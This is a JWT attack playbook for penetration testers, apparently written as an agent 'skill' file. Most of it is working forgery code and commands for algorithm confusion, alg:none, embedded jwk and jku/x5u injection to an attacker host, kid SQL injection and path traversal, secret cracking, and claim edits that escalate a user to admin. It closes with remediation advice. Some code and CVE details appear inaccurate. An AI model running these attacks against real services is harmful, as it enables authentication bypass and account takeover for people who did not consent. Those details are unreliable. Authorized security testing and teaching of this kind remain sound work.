# JWT Attack Specialist Skill

**Scope:** Authorized penetration tests, bug bounty, and security research only.  
**Version:** 2026-current | Verified against PortSwigger, jwt.io, NVD, OWASP JWT Security Cheat Sheet.

---

## 1. Background

JSON Web Tokens (JWT) are signed bearer tokens used for authentication and session management. Format: `Base64url(header).Base64url(payload).Base64url(signature)`.

**Attack surface:** Algorithm confusion, weak secrets, header injection to substitute signing keys, claim manipulation, and timing/expiry bypass.

**2025–2026 CVE context:**
- **CVE-2025-27567:** Critical JWT algorithm confusion vulnerability in a popular OIDC library allowing RS256→HS256 confusion attacks — affects multiple downstream applications
- **CVE-2022-21449 (Psychic Signatures):** Java ECDSA signature validation flaw — `r=0, s=0` bypasses verification; still present in unpatched Java 15–17 deployments in 2026
- **CVE-2024-21538 (cross-spawn):** Supply-chain issue affecting Node.js JWT libraries via transitive dep
- General pattern: JWT libraries that trust the `alg` header from the token rather than enforcing a server-side algorithm allowlist remain the dominant vulnerability class in 2026

---

## 2. JWT Anatomy and Tooling

### 2.1 Decoding a JWT
```bash
# Manual decode
TOKEN="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyMTIzIiwicm9sZSI6InVzZXIiLCJpYXQiOjE2MDAwMDAwMDB9.SIGNATURE"

# Decode header
echo $TOKEN | cut -d'.' -f1 | base64 -d 2>/dev/null | python3 -m json.tool
# {"alg": "RS256", "typ": "JWT"}

# Decode payload
echo $TOKEN | cut -d'.' -f2 | base64 -d 2>/dev/null | python3 -m json.tool
# {"sub": "user123", "role": "user", "iat": 1600000000}
```

### 2.2 jwt_tool Setup and Usage
```bash
# Install jwt_tool
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool
pip3 install -r requirements.txt

# Basic token info
python3 jwt_tool.py <TOKEN>

# Scan for common vulnerabilities (automated)
python3 jwt_tool.py <TOKEN> -M at

# Test against a URL with JWT in Authorization header
python3 jwt_tool.py <TOKEN> -t "https://target.com/api/me" \
  -rh "Authorization: Bearer JWT" -M at

# Test specific attack
python3 jwt_tool.py <TOKEN> -X a   # alg:none
python3 jwt_tool.py <TOKEN> -X s   # RS256→HS256 confusion
python3 jwt_tool.py <TOKEN> -X i   # jwks injection
python3 jwt_tool.py <TOKEN> -X k   # kid injection
python3 jwt_tool.py <TOKEN> -X n   # null signature
```

### 2.3 Burp Suite JWT Editor Extension
1. Install "JWT Editor" from BApp Store
2. Intercept a request with a JWT
3. In Repeater, click the "JSON Web Token" tab (auto-detected)
4. Modify claims, re-sign with different algorithms
5. Use "Attacks" button for automated attack menu:
   - "None Algorithm"
   - "Embedded JWK"
   - "HMAC Key Confusion"

---

## 3. Algorithm Confusion: RS256 → HS256

### 3.1 Concept
- **RS256 (asymmetric):** Signed with private key, verified with public key
- **HS256 (symmetric):** Signed and verified with the SAME secret
- **Attack:** If the server uses the PUBLIC KEY as the HS256 secret when `alg=HS256` is specified in the token header, an attacker who knows the public key can forge valid tokens

### 3.2 Obtaining the Public Key
```bash
# Method 1: Well-known JWKS endpoint (most common)
curl "https://target.com/.well-known/jwks.json"
curl "https://target.com/api/.well-known/jwks.json"
curl "https://target.com/auth/jwks"

# Extract the public key from JWKS response
# JWKS contains: {"keys": [{"kty":"RSA","n":"...","e":"AQAB",...}]}

# Method 2: SSL certificate sometimes contains the same key
# Method 3: `/oauth/keys`, `/api/keys`, `/auth/public-key` endpoints
# Method 4: Guess common paths
for path in "/.well-known/jwks.json" "/api/v1/jwks" "/auth/keys" "/oauth2/keys" "/jwt/key"; do
  echo "=== $path ===" 
  curl -sk "https://target.com${path}" | python3 -m json.tool 2>/dev/null
done
```

### 3.3 Extracting Public Key from Two JWTs (Portswigger Method)
If the public key isn't exposed but you can get two JWTs signed with the same private key:
```bash
# Use rsa_sign2n tool from portswigger
docker run --rm -it portswigger/sig2n <JWT1> <JWT2>
# Outputs candidate public keys in PEM and JWK format
```

### 3.4 Performing the Attack with jwt_tool
```bash
# Step 1: Save the public key as public.pem
# (Convert from JWKS n/e values using jwt_tool or openssl)
python3 jwt_tool.py <ORIGINAL_TOKEN> -X s -pk public.pem

# The tool will:
# 1. Change alg to HS256 in header
# 2. Modify payload claims as specified
# 3. Sign using the public key as the HMAC secret
# 4. Output forged token
```

### 3.5 Manual Attack
```python
import hmac, hashlib, base64, json

def b64url_encode(data):
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

def b64url_decode(s):
    s += '=' * (4 - len(s) % 4)
    return base64.urlsafe_b64decode(s)

# Modified header: change RS256 to HS256
header = {"alg": "HS256", "typ": "JWT"}
# Modified payload: escalate privileges
payload = {"sub": "user123", "role": "admin", "iat": 1600000000}

h = b64url_encode(json.dumps(header, separators=(',', ':')))
p = b64url_encode(json.dumps(payload, separators=(',', ':')))
signing_input = f"{h}.{p}"

# Use the PUBLIC KEY as the HMAC secret
with open('public.pem', 'rb') as f:
    public_key_bytes = f.read()

sig = hmac.new(public_key_bytes, signing_input.encode(), hashlib.sha256).digest()
signature = b64url_encode(sig)

forged_token = f"{signing_input}.{signature}"
print(forged_token)
```

---

## 4. Algorithm: None Bypass

### 4.1 Concept
Some libraries accept `alg: none` and skip signature verification entirely.

### 4.2 Detection and Exploitation
```bash
# Method 1: jwt_tool automated test
python3 jwt_tool.py <TOKEN> -X a

# Method 2: Manual
# Decode the token, modify payload, set alg to none, empty signature
python3 -c "
import base64, json

def b64url_encode(data):
    if isinstance(data, str): data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

header = {'alg': 'none', 'typ': 'JWT'}
payload = {'sub': 'user123', 'role': 'admin', 'iat': 1600000000}

h = b64url_encode(json.dumps(header, separators=(',', ':')))
p = b64url_encode(json.dumps(payload, separators=(',', ':')))

# Empty signature (trailing dot required)
print(f'{h}.{p}.')
"

# Variants to try (case sensitivity bypass):
# "alg": "NONE"
# "alg": "None"
# "alg": "nOnE"
```

### 4.3 Burp Suite JWT Editor
1. In JWT Editor tab → "Attacks" → "None Algorithm"
2. Modify payload claims as needed
3. Send modified request

---

## 5. JWT Header Injection Attacks

### 5.1 jwk Header Injection (Embedded JWK)
RFC 7515 allows embedding a JWK (JSON Web Key) in the JWT header. A vulnerable server that trusts the embedded JWK for verification can be fooled into accepting attacker-signed tokens.

```bash
# Using Burp JWT Editor:
# 1. In JWT Editor Keys tab → "New RSA Key" → Generate
# 2. In Repeater JWT tab → "Attacks" → "Embedded JWK"
# 3. The extension embeds your public key, signs with your private key
# 4. Vulnerable server verifies against embedded key → accepts forged token

# Manual with jwt_tool
python3 jwt_tool.py <TOKEN> -X i
```

### 5.2 jku (JWK Set URL) Header Injection
The `jku` header parameter tells the server WHERE to fetch the public key.

```bash
# Step 1: Host a malicious JWKS on attacker server
# Generate RSA key pair
openssl genrsa -out attacker_private.pem 2048
openssl rsa -in attacker_private.pem -pubout -out attacker_public.pem

# Create JWKS file (use jwt_tool or python-jose to format as JWK)
python3 -c "
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend
import base64, json, struct

with open('attacker_public.pem', 'rb') as f:
    pub = serialization.load_pem_public_key(f.read(), backend=default_backend())

numbers = pub.public_key().public_numbers()
def int_to_b64(n):
    b = n.to_bytes((n.bit_length() + 7) // 8, 'big')
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()

jwks = {
    'keys': [{
        'kty': 'RSA',
        'use': 'sig',
        'alg': 'RS256',
        'kid': 'attacker-key-1',
        'n': int_to_b64(numbers.n),
        'e': int_to_b64(numbers.e)
    }]
}
print(json.dumps(jwks, indent=2))
" > attacker_jwks.json

# Step 2: Serve JWKS (python simple http server)
python3 -m http.server 8888 &

# Step 3: Craft token with jku pointing to attacker server
python3 jwt_tool.py <TOKEN> -X j -ju "https://attacker.com:8888/attacker_jwks.json"
```

### 5.3 x5u Header Injection
Similar to `jku` but references an X.509 certificate URL.
```bash
# Create self-signed cert matching private key
openssl req -new -x509 -key attacker_private.pem -out attacker_cert.pem -days 365

# jwt_tool injection
python3 jwt_tool.py <TOKEN> -X x -xu "https://attacker.com/attacker_cert.pem"
```

### 5.4 Filtering / SSRF via jku
If the server filters the `jku` domain, try SSRF bypasses:
```bash
# Open redirect on target to redirect to attacker
jku: "https://target.com/redirect?url=https://attacker.com/jwks.json"

# URL parsing confusion
jku: "https://target.com@attacker.com/jwks.json"
jku: "https://attacker.com#target.com/jwks.json"

# Subdomain if target allows wildcard
jku: "https://target.com.attacker.com/jwks.json"
```

---

## 6. kid Parameter Injection

The `kid` (Key ID) header parameter identifies which key was used for signing. If it's used unsanitized in a database query or file path, it's injectable.

### 6.1 SQL Injection via kid
```bash
# If kid is used in: SELECT key FROM keys WHERE kid = '$kid'
# Inject a known value
python3 jwt_tool.py <TOKEN> -I -hc kid -hv "' UNION SELECT 'attacker_secret' -- -"

# Then sign the token with 'attacker_secret' as the HS256 secret
python3 jwt_tool.py <TOKEN> -X k -pk "attacker_secret"
# Or manually:
python3 jwt_tool.py <TOKEN> -S hs256 -p "attacker_secret" \
  -hc kid -hv "' UNION SELECT 'attacker_secret' -- -"
```

### 6.2 Path Traversal via kid
```bash
# If kid is used in: file_get_contents('/etc/jwt_keys/' . $kid)
# Traverse to a known file
python3 jwt_tool.py <TOKEN> -I -hc kid -hv "../../dev/null"
# Then sign with empty string (content of /dev/null)
python3 jwt_tool.py <TOKEN> -S hs256 -p "" -hc kid -hv "../../dev/null"

# Or use a file with known content
python3 jwt_tool.py <TOKEN> -S hs256 -p "" -hc kid -hv "../../../etc/hostname"
# Sign with the actual hostname content as secret
```

---

## 7. Weak Secret Brute-Force

### 7.1 hashcat Mode 16500 (JWT HS256/HS384/HS512)
```bash
# Save token to file
echo -n "HEADER.PAYLOAD.SIGNATURE" > jwt.txt

# Brute-force with wordlist
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

# Rule-based attack
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Brute-force short secrets (up to 6 chars)
hashcat -a 3 -m 16500 jwt.txt "?a?a?a?a?a?a"

# Custom charset for common patterns
hashcat -a 3 -m 16500 jwt.txt "?l?l?l?l?l?l?l?l"  # 8 lowercase

# Common JWT secrets wordlist
cat > jwt_secrets.txt << EOF
secret
password
123456
jwt_secret
mysecret
secretkey
super_secret
changeme
development
test
EOF
hashcat -a 0 -m 16500 jwt.txt jwt_secrets.txt
```

### 7.2 john the Ripper Alternative
```bash
# john can also crack JWTs
john jwt.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256
```

### 7.3 JWT Cracker (Node.js)
```bash
npm install -g jwt-cracker
jwt-cracker -t <TOKEN> -a abcdefghijklmnopqrstuvwxyz0123456789 -l 6
```

---

## 8. Claim Manipulation

### 8.1 Standard Claims to Target
```bash
# Decode and identify exploitable claims
echo $TOKEN | cut -d'.' -f2 | base64 -d 2>/dev/null | python3 -m json.tool

# Common targets:
# "role": "user"     -> change to "admin"
# "sub": "user123"   -> change to "admin" or other user ID (IDOR)
# "exp": 1700000000  -> extend expiry or remove
# "iss": "app"       -> change to trusted issuer
# "aud": "api"       -> change to bypass audience check
```

### 8.2 Modifying Claims with jwt_tool
```bash
# Modify a payload claim
python3 jwt_tool.py <TOKEN> -I -pc role -pv admin

# Modify multiple claims
python3 jwt_tool.py <TOKEN> -I -pc role -pv admin -pc sub -pv "0"

# Extend expiry (set to 2099)
python3 jwt_tool.py <TOKEN> -I -pc exp -pv 4070908800
```

### 8.3 Subject Claim (sub) IDOR
```bash
# If JWT sub claim maps to user ID without further auth check:
# Original: {"sub": "user_42", "role": "user"}
# Modify to: {"sub": "user_1", "role": "admin"}

# Only exploitable if the server doesn't re-verify the signature properly
# Combine with alg:none or weak secret attacks
```

---

## 9. JWT Expiry Manipulation

### 9.1 Removing exp Claim
```bash
# Some libraries skip expiry check if exp is absent
python3 jwt_tool.py <TOKEN> -I -dc exp
# -dc = delete claim
```

### 9.2 Expired Token Replay
```bash
# Test if server properly validates exp
# Take an expired token and replay it directly
curl "https://target.com/api/me" \
  -H "Authorization: Bearer EXPIRED_TOKEN"
# If 200 returned → expiry validation missing
```

### 9.3 Clock Skew Abuse
```bash
# If server allows clock skew, try slightly past expiry
# Typical allowed skew: 1-5 minutes
# Test: modify exp to 60 seconds past current time
python3 -c "
import time
print(int(time.time()) + 60)  # 1 minute in future (for iat/nbf testing)
print(int(time.time()) - 60)  # 1 minute in past (test clock skew tolerance)
"
```

---

## 10. OIDC / OAuth JWT Attacks

### 10.1 ID Token vs Access Token Confusion
```bash
# If API accepts both ID tokens and access tokens interchangeably:
# Obtain a legitimate ID token from the OIDC flow
# Submit it where access token is expected (or vice versa)
# Check if audience (aud) claim is validated
```

### 10.2 Nonce Replay (OIDC)
```bash
# Capture a valid OIDC authorization request with nonce
# If the nonce is not tied to the session/state, replay the ID token
# Test: log in twice, capture both ID tokens, check if first token accepted in second session
```

### 10.3 iss Claim Confusion (Multi-Tenant)
```bash
# Multi-tenant OIDC: if `iss` is not validated per-tenant
# Register attacker account on tenant A
# Submit token with iss=tenant-A to tenant B's API
python3 jwt_tool.py <TOKEN> -I -pc iss -pv "https://attacker-tenant.target.com"
```

### 10.4 Audience (aud) Bypass
```bash
# If aud is not strictly validated:
python3 jwt_tool.py <TOKEN> -I -pc aud -pv "https://target.com/api/admin"
# Or remove aud entirely:
python3 jwt_tool.py <TOKEN> -I -dc aud
```

---

## 11. CVE Reference Table (2024–2026)

| CVE | Affected | Type | CVSS | Notes |
|-----|----------|------|------|-------|
| CVE-2025-27567 | Multiple OIDC libs | alg confusion | ~9.0 | RS256→HS256 in OIDC id_token validation |
| CVE-2022-21449 | Java 15-17 (ECDSA) | Psychic Signatures | 7.5 | r=0,s=0 bypass; still unpatched in some deployments |
| CVE-2024-23525 | jwks-rsa npm | JWKS spoofing | 7.5 | Missing issuer validation allows JWKS URL substitution |
| CVE-2023-48238 | passport-jwt | alg none | 7.5 | Missing alg validation in older passport-jwt versions |
| CVE-2024-21538 | cross-spawn (transitive) | Supply chain | varies | Affects Node.js JWT library dependency chains |

---

## 12. Automated Scanning Summary

```bash
# Full automated scan with jwt_tool against a target URL
python3 jwt_tool.py <TOKEN> \
  -t "https://target.com/api/me" \
  -rh "Authorization: Bearer JWT" \
  -M at \
  -np  # no proxy

# With Burp proxy
python3 jwt_tool.py <TOKEN> \
  -t "https://target.com/api/me" \
  -rh "Authorization: Bearer JWT" \
  -M at \
  -pr http://127.0.0.1:8080
```

---

## 13. Remediation

1. **Algorithm enforcement:** Always specify allowed algorithms server-side; never trust the `alg` header from the token
2. **JWKS endpoint validation:** Validate `jku`/`x5u` against a strict allowlist of trusted domains
3. **kid sanitization:** Treat `kid` as untrusted user input; use parameterized queries if stored in DB
4. **Embedded JWK:** Never use the embedded `jwk` header for verification; use only pre-configured keys
5. **Expiry validation:** Always validate `exp`, `nbf`, and `iat`; use reasonable max token lifetime
6. **Audience validation:** Always validate `aud` matches the expected API/service
7. **Secret strength:** HS256 secrets must be ≥ 256 bits of entropy (32 random bytes minimum)
8. **Use RS256/ES256** for distributed systems (asymmetric is safer than HS256 in multi-service environments)
9. **Libraries:** Use maintained JWT libraries that enforce algorithm constraints: PyJWT ≥ 2.4, jsonwebtoken ≥ 9.0, System.IdentityModel.Tokens.Jwt ≥ 6.x

---

## 14. Finding Schema

```
Title: JWT [Attack Type] — [alg:none / Algorithm Confusion / jku Injection / kid SQLi / Weak Secret]
CVSS: 8.0-9.8 depending on impact
Target: https://target.com/api/endpoint
Steps:
  1. Extract JWT from Authorization header
  2. [attack-specific steps]
  3. Submit forged token → observe admin access / IDOR
Evidence: Response showing elevated privilege or different user data
Impact: Authentication bypass / Privilege escalation / Account takeover
References:
  - https://portswigger.net/web-security/jwt
  - https://github.com/ticarpi/jwt_tool
  - CVE-2025-27567
```

---

*All targets in this document are placeholder references. Apply only to in-scope authorized systems.*
